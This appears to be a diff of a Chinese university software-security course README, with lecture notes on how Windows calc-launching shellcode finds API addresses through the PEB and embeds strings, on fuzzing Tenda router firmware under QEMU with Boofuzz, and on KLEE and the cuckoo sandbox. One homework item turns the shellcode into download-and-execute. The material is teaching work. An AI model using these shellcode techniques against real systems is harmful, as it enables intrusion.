+        - code反汇编之后，就是汇编的源码。这段code，就是通过前面的汇编代码，编译以后直接从汇编编译以后，从可执行文件中 dump 出来的
+
+            ```bash
+            ; nasm -f win32 win32-WinExec_Calc-Exit.asm -o win32-WinExec_Calc-Exit.o
+            ; for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+            ```
+
+            - nasm 汇编器编译为 .o文件，然后用objdump
+            - 在bash或者Linux环境中运行一下这两个命令，能够得到code。由于编译器版本不一样， code 可能会略有区别
+            - 把这之前的汇编代码保存为win32-WinExec_Calc-Exit.asm，然后在Linux下运行两条命令，得到的结果如下
+
+                <img src="./readmeimg/2020-4-22-img/asm.png" width=70%>
+
+### 解读shellcode代码
+
+如果用C语言编写一个运行计算器的程序，其实很简单，只需要调用一下WinExec函数或者CreateProcess函数，如果用汇编来写，也就是几条指令的事，几个参数 push 入栈以后，call函数地址就能调用函数地址
+  
+**为什么这段代码写的这么复杂呢？**
+
+#### 寻找调用的API函数
+
+如果是在C语言中编写调用WinExec函数，call之后的WinExec函数的地址，是编译器在可执行程序的导入表中导入了(WinExec用来运行计算器程序)。在进程初始化的过程中，系统会帮我们计算好WinExec函数的地址，然后把函数地址放在导入表中指定的位置。
+
+在shellcode中，有这个过程吗？我们最终是要把这代code嵌入到溢出攻击的数据中，而被攻击的目标对象没有动态链接的过程，也就是code这段代码如果要call WinExec，就要自己找WinExec的地址
+
+shellcode进行**API函数的动态链接**(在一个进程初始化的过程中，操作系统在干的事情) > 找到需要调用的API函数的地址
+
+能否用GetProcAddress函数，可以获得API函数的地址。GetProcAddress函数也是一个API，GetProcAddress函数的地址未知，如果能调用GetProcAddress函数，则WinExec也能调了 > 所以**任何 API 地址都没有**
+
+shellcode进入到了一个完全陌生的环境。早期的黑客们思考能不能比较原始的办法，能够获得API地址
+- 其实操作系统也有一个加载的过程，黑客们逆向分析了Windows系统的内部代码，分析了Windows系统内部管理进程初始化相关的数据结构，发现有一个链表，管理了所有的已经加载的dll文件
+- 这个链表，就是这个代码里的`InitOrderModuleList`。这个`InitOrderModuleList`在一个称为 LDR 的数据结构里。这个LDR的数据结构，又在 PEB 这个数据结构里，进程环境块。而PEB数据结构，在每个进程中，是一个**固定的位置**，是一个**绝对的常量地址**，这个地址就是`fs:ebx+0x30`
+- 所以地址就可以不依赖于任何API或者其他依赖，直接用汇编代码就能访问到
+
+从这里能一层层找到dll的基地址，然后再从dll的基地址，通过PE文件的数据结构，文件头，找到dll的导出表。然后再在导出表中的数据结构中，通过函数名称的比较，得到已经在内存中的函数的地址。所以代码中的循环，findFunctionAddr 的递归函数，和 searchLoop ，就是在遍历dll的导出表
+
+代码中大量使用到了硬编码的偏移地址，比如
+
+<img src="./readmeimg/hardcode-address.png" width=50%>
+
+就是因为上面这些说到的系统的数据结构，都是固定的结构，在每个系统中都是一样的，所以可以固定。
+
+通过系统中若干数据结构这种原始的访问方式，可以找到API函数
+
+#### 字符串
+
+shellcode中还用到了字符串，至少函数地址的名称是需要的，还有调用WinExec的参数 calc.exe ，如果在C语言里编程，编译器会把可执行程序的代码和字符串，放在不同的地址。
+  
+代码、机器指令在text段中，字符串在data段 > 地址相差很远。而objdump只取了代码段，没有取数据段。若是全都取，则shellcode就太大，因为中间可能会有很多的填充字符，而且数据地址很有可能是绝对地址，而code经过dump后放在其他环境中执行，地址会发生变化。**所以字符串，code也是找不到的**
+
+唯一的办法是用一种方式把字符串**硬编码**在shellcode中，让字符串，变为代码的一部分，内嵌在机器指令中。
+
+<img src="./readmeimg/2020-4-22-img/calcbigending.png">
+
+- `636c6163`和`6578652e`是 calc.exe 的 big ending 反写，压入栈以后，就形成了字符串。这样就把字符串嵌入机器指令了，作为机器指令的操作数。
+
+# 作业
+
+1. 详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。
+2. 修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
+   - 其中第二个作业，原参考代码只调用了一个API函数，作业要求调用更多的API函数了，其中涉及到的参数也更复杂，但是原理是相通的。URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以可能还需要调用LoadLibrary函数
+
+## [实验结果](./hw-0x06-Shellcode/README.md)
+
+# 参考资料
+
+- https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-peb
+- https://www.cnblogs.com/binlmmhc/p/6501545.html
+- https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
+- https://en.wikipedia.org/wiki/Process_Environment_Block
+
+</details>
+
+---
+
+<details>
 <summary>2020-4-29 二进制安全 [无作业] </summary>
 
 # 软件安全中的二进制安全
@@ -904,7 +1432,206 @@ Student继承了AbstractUser后，告诉Django用Student作为系统用户管理
 ---
 
 <details>
-<summary>2020-5-13 符号执行 + KLEE</summary>
+<summary>2020-5-6 模糊测试 [作业：Fuzzing]</summary>
+
+# 漏洞挖掘实战 - Fuzzing(模糊测试)
+
+Fuzzing目前也是漏洞挖掘的主要方法之一，是各种漏洞挖掘技术中人力消耗比较低，技术门槛比较低，同时效果却比较好的一种方法，其他的方法比如程序分析、符号执行等也有人在用，但是难度相对较大一些
+
+## Fuzzing挖掘漏洞过程
+
+### 确立目标
+
+1. 对什么软件进行漏洞挖掘，软件是做什么的
+2. 数据来源是文件还是网络，或者既有文件又有网络
+   - Fuzzing的主要原理就是随机性的大量给被测试软件输入数据，首先就需要知道软件是处理什么样的数据，应该如何给软件输入数据。
+   - 一般来讲，现在主要就是文件和网络两种。如果是文件型的，最典型的比如Word，那么我们就需要构造大量的文件；如果是网络的，比如一个Web服务器，那么我们就需要构造大量的网络数据包发送给被测试软件。我们一般称为文件型Fuzzing和网络型Fuzzing
+
+### 构造软件的运行环境
+
+如果是Windows Linux的应用软件，可以直接运行。如果是手机软件，由于手机自带的调试功能比较弱，不方便控制和输入，一般可能需要一个模拟器来运行。
+
+### 选择一个Fuzzing的框架
+
+Fuzzing技术发展了很多年，有很多人已经开发了不少框架。框架已经解决了Fuzzing测试中的一些基本的共性的问题，我们不需要重头开始做。在框架的基础上，我们只需要进行一些配置或者少量的编程就可以开始进行测试了。
+
+### 选择一种策略
+
+#### 基于生成vs基于变异的
+
+基于生成：我们的数据完全是**重新构造**的，不基于一些已有的数据或者模板。当然重新构造的过程中，也不能完全瞎构造，通常有效的测试数据并不是完全畸形的数据，而是**半畸形数据**。因为完全畸形的数据，可能在到达测试对象之前就已经被丢弃了。比如一个网络数据包，如果不符合数据包的基本格式、连IP地址都不对，那肯定是到不了被测试对象的。所以基于生成的，也需要在规则、协议、文件格式的基础上进行。所以基于生成的策略，一般**只对协议已知、格式开放的目标**。
+
+一些未知协议或者格式不清楚的数据，就可以采用基于变异的策略。在已有的合法数据基础上，通过一定的随机性的变化来得到测试数据。
+- 已有的合法数据比较容易得到，比如很多年前Word没有开放doc文件的格式，如果我们要对Word进行Fuzzing，就应该采取基于变异的策略：用Word先保存生产一个合法的doc文件，再在这个合法的doc文件的基础上大量变异，也就是随机性的替换一些数据、插入删除一些片段数据来得到大量的测试数据。
+- 同样，如果是对网络程序进行Fuzzing，我们可以让网络程序先正常运行，抓取数据包。然后对抓取的数据包进行重放，重放过程中进行一定比例的变异（随机性的替换、插入、删除）。
+
+## 模糊测试技术总结
+
+模糊测试技术是一种通过**注入缺陷**实现的**自动化软件测试技术**。其基础是在执行时将包括无效的、意外的或随机的数据输入注入到程序中，监视程序是否出现崩溃等异常，以获取意外行为并识别潜在漏洞。
+
+模糊测试的重点在于**输入用例的构造**。测试用例的生成方式可基于生成或基于变异。
+- 基于生成的模糊测试(Smart Fuzzing)首先对目标程序进行分析，尽可能收集有关它的信息，基于这些信息生成测试数据。此技术基于前期大量分析构造有效的测试数据，自动化程度相对较低。
+- 基于变异的模糊测试(Dumb Fuzzing)根据一定的规则对现有的样本数据进行修改并生成模糊测试用例。该生成方法简单，但是并未考虑程序自身的特点，因此生成测试用例有效性较低，漏报率高。
+
+但是模糊测试在一定程度上降低了安全性测试的门槛，原理简单，一般不会误报。但是对目标对象知识的获取程度直接影响模糊测试的效果。而且，模糊测试技术无法检测所有漏洞。
+
+## 实例 - 对家用路由器采用Fuzzing技术进行漏洞挖掘
+
+### 搭建执行环境
+
+首先，需要了解到，这种路由器，其实是硬件和软件一体的一个小型的设备。
+- 它的架构和我们的电脑、手机其实有相同的地方。它也有CPU、内部有操作系统、在操作系统中还有少量的应用软件，来实现路由器的一些功能。
+- 不同的是，这种小型路由器一般是MIPS架构的CPU，我们的电脑一般是intel架构的CPU(x86 x64)，Intel架构的CPU既包括Intel生产的CPU，也包括AMD公司生产的CPU。我们的手机都是ARM架构的CPU。
+- 这几种架构各有特点。MIPS适合小型化设备，功耗低性能弱、价格便宜，结构简单。ARM适合中型一些的设备，体积小能耗小功能适合手机，但是价格比较高。x86_64适合电脑和服务器，能耗高（发热也就高）、性能最高，价格最贵，结构最复杂。
+- 这几种CPU架构，他们的指令集是不一样的，所以有各自的汇编语言，也有各自的编译器工具链。手机操作系统并不能运行在PC上，同样这种路由器的操作系统，也无法直接运行在PC上。
+
+所以前期有一些环境搭建的工作，需要把路由器的系统运行在模拟器中。QEMU就是中场景下广泛使用的模拟器。所以如果进行家用路由器的漏洞挖掘，首先第一步可能是安装 [QEMU](https://www.qemu.org/)
+
+ubuntu下，一个成功的QEMU安装实例 / 使用Windows系统的可以直接下载安装包(但是由于后面我们还有其他工具大多时运行在Linux系统中的，所以我们的Fuzzing实验可能需要在Linux系统中进行。)
+```bash
+apt-get install zlib1g-dev
+apt-get install libglib2.0-0
+apt-get install libglib2.0-dev
+apt-get install libtool
+apt-get install libsdll.2-dev
+apt-get install libpixman-1-dev
+apt-get install autoconf
+apt-get install qemu
+apt-get install qemu-user-static
+apt-get install qemu-system
+```
+
+QEMU的基本原理是**模拟各种CPU的执行环境**，用软件来实现CPU的硬件功能并封闭出来执行的环境。使用QEMU可以跨平台运行系统和软件。在软件开发和调试中应用非常广泛。比如我们开发手机APP，安卓系统的调试模拟环境就是基于QEMU的。
+
+### 把目标程序在执行环境中运行
+
+路由器的操作系统和整个应用软件，是植入到路由器的存储器中的，就像PC中的系统和软件安装在硬盘上一样。由于路由器功能单一，系统不大，所以一般将操作系统和应用程序打包成一个镜像文件，称为固件(Firmware)。如果有了固件，就可以在模拟器中运行整个路由器了。
+
+所以路由器也是分为硬件和软件的，其bug和漏洞也主要是出现在软件中，软件都位于固件中，硬件中的问题我们一般不考虑。
+
+固件的主体是一个裁剪过的微型Linux系统，然后在这个系统至少运行一些实现路由器功能的应用程序。比如会有实现路由协议的、实现包转发的程序、实现用户配置的程序（一般是一个Web服务器）、实现内网地址分发的DHCP的程序等。
+
+要得到固件，有两种办法：直接从路由器中提取；从官方网站上下载一个固件。路由器中当然是有固件的，否则它不能运行。厂家的官方网站有时候会开放固件供下载，因为有一些用户有升级固件的需求，比如上一个版本的固件中发现了bug，厂家就会在网站上发布一个新的固件，让用户在配置界面中升级。虽然对大多数用户不会去升级路由器的固件，但是负责任的厂家有更新的义务。不过既然绝大部分不更新，也不会更新，所以也有一些厂家不提供。那么如果有有固件的，我们可以直接下载，没有的，就需要提取。
+
+提取固件，也有现成的工具，比如binwalk。比如这是使用binwalk工具提取了一款tenda路由器的固件。
+
+<img src="./readmeimg/2020-5-6-img/tenda.png" width=70%>
+
+提取以后的固件使用QEMU加载运行，使用qemu-arm-static运行提取的固件。可以看到，路由器中用于用户配置的Web服务器已经运行起来了。
+
+<img src="./readmeimg/2020-5-6-img/qemu-run.png" width=70%>
+
+- 这种小型设备一般使用httpd这种小型的静态的http server
+
+### 对已经运行起来的目标系统中进行Fuzzing测试
+
+搭建一个针对这种小型路由的漏洞挖掘工作环境的流程。
+
+<img src="./readmeimg/2020-5-6-img/fuzzing-process.png">
+
+有一些下载的固件或者固件内部的部分软件是源代码形式的，所以可能还需要编译一下。这里的编译称为交叉编译。以前在一个x86架构下的PC中，编译一个本架构下的软件，编译后在本机运行。而交叉编译是编译一个在其他系统中运行的软件，比如在x86系统中编译一个MIPS架构的软件。由于MIPS架构的主机一般性能不高，软件环境单一，所以通常不作为工作环境，也跑不起来编译器。所以我们在PC上进行编译，发布在响应环境中运行，这种称为交叉编译。mips-gcc 和 mipsel-gcc 编译器就是交叉编译器。所以，在实验过程中，根据情况，可能还有其他的支撑工具需要使用。
+
+搭建好环境以后，系统和应用已经运行起来。下一步，就可以使用Fuzzing测试工具进行测试了。Fuzzing已经有一些框架可以使用：SPIKE、AFL、Sulley、BooFuzz
+
+#### AFL
+
+- AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：
+  1. 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；
+  2. 选择一些输入文件，作为初始测试集加入输入队列（queue）；
+  3. 将队列中的文件按一定的策略进行“突变”；
+  4. 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中；
+  5. 上述过程会一直循环进行，期间触发了crash的文件会被记录下来。
+   
+   <img src="./readmeimg/2020-5-6-img/AFL.jpg">
+
+   - 可以看出AFL是基于变异策略的。所以的Fuzzing测试有一个目标就是通过输入畸形数据让程序崩溃crash，程序的崩溃往往就意味着有bug或者有漏洞，然后对引起崩溃的输入样本，或者崩溃或的系统日志、dump文件等进行分析。
+   - AFL用了一种称为插桩的技术来进行崩溃的检测。
+
+#### SPIKE
+
+- SPIKE是由Dave Aitel编写的一款非常著名的Protocol Fuzz（针对网络协议的模糊测试）工具，完全开源免费。它提供一系列API用于用户使用C语言创建自己的网络协议模糊测试器。SPIKE定义了许多可用于C编码器的原语，这些原语允许其构造可以发送给网络服务的模糊消息以测试是否产生错误。SPIKE功能如下：
+  1. 含大量可用于处理程序中产生错误的字符串。并且，SPIKE能够确定哪些值最适合发送到应用程序，从而以一种有用的方式导致应用程序异常。
+  2. SPIKE引入“块”的概念，用于计算由SPKIE代码生成的数据内指定部分的大小，并且可以将这些值以各种不同的格式插入。
+  3. 支持并以不同格式接收许多在网络协议中常用的不同数据类型。
+  - SPIKE功能强大，是一款优秀的模糊测试工具，但是文档较少，只能根据各种参考资料和一些测试脚本整理常用的API使用方法。
+
+#### Sulley
+
+- Sulley是由Pedram Amini编写的一款灵活且强大的模糊测试工具。可用于模糊化文件格式、网络协议、命令行参数和其它代码。除了专注于数据生成外，Sulley还具有如下功能：
+  1. 监视网络并保留记录。
+  2. 检测和监控目标程序的健康状况，能够使用多种方法恢复到已知的良好状态。
+  3. 检测、跟踪和分类检测到的故障。
+  4. 可以并行执行测试，提高检测速度。
+  5. 自动确定测试用例触发的特殊错误。
+  - Sulley功能比SPIKE更加的完善，能够进行构造模糊测试数据、监测网络流量、进行错误检测等，但是Sulley检测只能用于x86平台。
+
+#### Boofuzz
+
+- Boofuzz是Sulley的继承与完善。Boofuzz框架主要包括四个部分：
+  1. 数据生成，根据协议原语构造请求。
+  2. 会话管理或驱动，将请求以图的形式链接起来形成会话，同时管理待测目标、代理、请求，还提供一个Web界面用于监视和控制检测、跟踪并可以分类检测到的故障。
+  3. 通过代理与目标进行交互以实现日志记录、对网络流量进行监控功能等。
+  4. 有独立的命令行工具，可以完成一些其他的功能。
+
+### 安装和配置BooFuzz
+
+使用Boofuzz对模拟器环境中的路由器程序进行测试主要步骤为：第一，根据网络请求数据包构造测试用例请求；第二，设置会话信息(目标IP、端口号等)，然后按照请求的先后顺序将其链接起来；第三，添加对目标设备的监控和重启机制等；第四，开始测试。
+
+比如上面那个tenda路由器，在运行起来以后，如果我们对其http服务进行Fuzzing，我们可以使用浏览器先访问他们的http 服务。这是路由器固件在QEMU中运行以后的结果。
+
+<img src="./readmeimg/2020-5-6-img/qemu-run.png">
+
+- 服务器监听在 192.168.148.4:81。通过浏览器访问192.168.148.4:81与路由器管理界面进行尽可能多的交互，使用Wireshark抓取到不同URI的数据包。
+- 对捕获的数据包进行分析，确定数据输入点，以抓取到的其中一个数据包为例：
+    ```
+    1   GET /goform/GetRouterStatus?0.7219206793806395&_=1587978102556  HTTP/1.1
+    2   Host: 192.168.148.4:81
+    3   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+    4   Accept: text/plain, */*; q=0.01
+    5   Accept-Language: en-US,en;q=0.5
+    6   Accept-Encoding: gzip, deflate
+    7   X-Requested-With: XMLHttpRequest
+    8   DNT: 1
+    9   Connection: keep-alive
+    10  Cookie:password=""
+    11  Referer: http://192.168.148.4:81/main.html
+    ```
+- 根据HTTP协议特点及缓冲区溢出漏洞特点，对该请求选取以下数据输入点
+  - 第1行，HTTP协议有GET、POST、PUT、DELETE、CONNECT、OPTIONS、TRACE等方法，若方法使用错误可能会超长缓冲区溢出漏洞，例如，相比GET方法，POST方法可以提交更多的数据，若使用POST方法提交的表单误用了GET方法进行提交，会导致查询字符串过长造成溢出，因此把数据包中的GET方法当成一个输入点。若URI超长，服务器在处理请求的时候使用危险函数读取URI或未对URI长度进行限制，也可能导致安全漏洞，因此将URI处也进行模糊测试。
+  - 第10行，若Cookie超长，程序认证用户身份信息时若用危险函数读取Cookie也可能造成缓冲区溢出，因此将Cookie处进行模糊测试。
+- 选定了一个具体目标，就可编写模糊测试脚本了。脚本的编写，需要查一下BooFuzz的官方文档，查看一是示例代码，比较容易。
+- 根据上述分析，利用Boofuzz提供的原语对HTTP请求进行定义，设置与会话相关的信息，包括目标设备IP地址、端口等。
+
+这是在测试过程中的一些截图。在模拟器中监视到了程序崩溃，造成程序异常的数据包主要是其Cookie字段过长，初步判断是由于Cookie字段造成缓冲区溢出导致程序异常退出。有了以上数据以后，就可以将引起崩溃的输入数据在调试环境下再次输入到测试对象，进行调试了。
+
+<img src="./readmeimg/2020-5-6-img/bug.png">
+
+这是上面那个漏洞的相关代码，在IDA-pro调试后定位的漏洞代码。图中的if语句不满足，函数不会读取R3寄存器存储地址，而是直接返回，因此，若在测试数据中添加.gif，则PC寄存器将会被覆盖。这些事后的分析是经过了非常多的调试工作以后确定的。工具主要是GDB和IDA-pro
+
+<img src="./readmeimg/2020-5-6-img/code.png">
+
+## 总结
+
+<img src="./readmeimg/2020-5-6-img/bugreappear.png">
+
+上图显示了我们使用binwalk QEMU BooFuzz GDB IDA-pro一系列工具，发现了路由器http管理界面由于cookie超长引起的一个缓冲区溢出漏洞的发现（复现）过程。
+
+漏洞挖掘是一个非常综合性的工程，设计到的工作比较细致，比较多。
+
+## 作业
+
+搜集市面上主要的路由器厂家、在厂家的官网中寻找可下载的固件在CVE漏洞数据中查找主要的家用路由器厂家的已经公开的漏洞，选择一两个能下载到且有已经公开漏洞的固件。如果能下载对应版本的固件，在QEMU中模拟运行。确定攻击面（对哪个端口那个协议进行Fuzzing测试），尽可能多的抓取攻击面正常的数据包（wireshark）。查阅BooFuzz的文档，编写这对这个攻击面，这个协议的脚本，进行Fuzzing。配置BooFuzz QEMU的崩溃异常检测，争取触发一次固件崩溃，获得崩溃相关的输入测试样本和日志。尝试使用调试器和IDA-pro监视目标程序的崩溃过程，分析原理。
+
+作业比较大。可能需要比较多时间。大家尽量做，至少要把几个工具用得比较熟悉。
+
+### [实验结果](./hw-0x07-Fuzzing/README.md)
+
+</details>
+
+---
+
+<details>
+<summary>2020-5-13 符号执行 + KLEE [作业：KLEE Three Tutorials]</summary>
 
 
 # 符号执行
@@ -1109,6 +1836,7 @@ KLEE不是使用的在线版本的示例性质的约束求解器，而是直接�
   - https://github.com/grese/klee-maze
   - https://feliam.wordpress.com/2010/10/07/the-symbolic-maze/
   - 把这个迷宫小游戏的代码整理编译运行一下，然后在教程的基础上使用KLEE来完成这个迷宫游戏的自动探路，体验一下符号执行是如何去根据程序分析来自动生成满足特定约束条件、覆盖指定程序执行路径的输入数据的
+- [实验结果](./hw-0x08-KLEE(Symbolic%20Execution)/README.md)
 
 #### 符号执行的主要问题
 
@@ -1125,7 +1853,7 @@ KLEE不是使用的在线版本的示例性质的约束求解器，而是直接�
 ---
 
 <details>
-<summary>2020-5-20 恶意软件防御体系 + cuckoo</summary>
+<summary>2020-5-20 恶意软件防御体系 + cuckoo [作业：cuckoo的搭建与程序的分析]</summary>
 
 # 恶意软件防御体系
 
@@ -1260,7 +1988,11 @@ KLEE不是使用的在线版本的示例性质的约束求解器，而是直接�
 - 对疑似恶意软件的分析，要在一个隔离环境中进行，是因为恶意软件有可能对环境进行破坏
 - 安全研究人员们开发了一种专门的既可以隔离恶意软件（使其恶意行为之限定在虚拟机内部，不会对其他环境造成而已的破坏）同时又可以追踪分析软件行为的的工具 - 沙箱
 - 目前应用得最广泛的沙箱是 [cuckoo](https://cuckoosandbox.org/) ，比较幸运的是它的编程接口是 python 的。使用 cuckoo ，可方便的进行程序行为分析，无需过分深入的研究让人头痛的系统内核机制和指令集
+
+## 实验
+ 
 - 安装并使用 cuckoo ，任意找一个程序，在 cuckoo 中 trace 获取软件行为的基本数据
+- [实验结果](./hw-0x09-cuckoo/README.md)
 
 </details>
 
